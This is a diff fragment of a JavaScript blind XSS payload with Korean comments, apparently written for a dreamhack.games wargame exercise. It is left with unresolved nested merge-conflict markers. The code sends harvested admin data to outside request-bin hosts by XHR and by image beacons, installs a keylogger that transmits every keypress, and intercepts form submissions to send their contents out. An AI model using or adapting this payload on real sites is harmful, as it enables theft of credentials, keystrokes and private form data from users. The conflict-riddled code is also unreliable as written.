@@ -40,18 +40,42 @@
         
         // 데이터 전송
         var xhr = new XMLHttpRequest();
+<<<<<<< HEAD
+<<<<<<< HEAD
+        xhr.open('POST', 'https://enxzoji.request.dreamhack.games/blind-steal', true);
+=======
+        xhr.open('POST', 'https://vtfdwtn.request.dreamhack.games/blind-steal', true);
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+=======
         xhr.open('POST', 'http://127.0.0.1:5000/blind-steal', true);
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify(adminData));
         
         // 백업 전송 방법 (이미지 태그)
         var img = new Image();
+<<<<<<< HEAD
+<<<<<<< HEAD
+        img.src = 'https://enxzoji.request.dreamhack.games/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
+=======
+        img.src = 'https://vtfdwtn.request.dreamhack.games/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+=======
         img.src = 'http://127.0.0.1:5000/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         
         // 키로거 설치
         document.addEventListener('keypress', function(e) {
             var k = new Image();
+<<<<<<< HEAD
+<<<<<<< HEAD
+            k.src = 'https://enxzoji.request.dreamhack.games/blind-key?k=' + e.key + '&t=' + Date.now();
+=======
+            k.src = 'https://vtfdwtn.request.dreamhack.games/blind-key?k=' + e.key + '&t=' + Date.now();
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+=======
             k.src = 'http://127.0.0.1:5000/blind-key?k=' + e.key + '&t=' + Date.now();
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         });
         
         // 폼 데이터 가로채기
@@ -63,7 +87,15 @@
             });
             
             var f = new Image();
+<<<<<<< HEAD
+<<<<<<< HEAD
+            f.src = 'https://enxzoji.request.dreamhack.games/blind-form?data=' + btoa(JSON.stringify(data));
+=======
+            f.src = 'https://vtfdwtn.request.dreamhack.games/blind-form?data=' + btoa(JSON.stringify(data));
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+=======
             f.src = 'http://127.0.0.1:5000/blind-form?data=' + btoa(JSON.stringify(data));
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         });
     })();
     
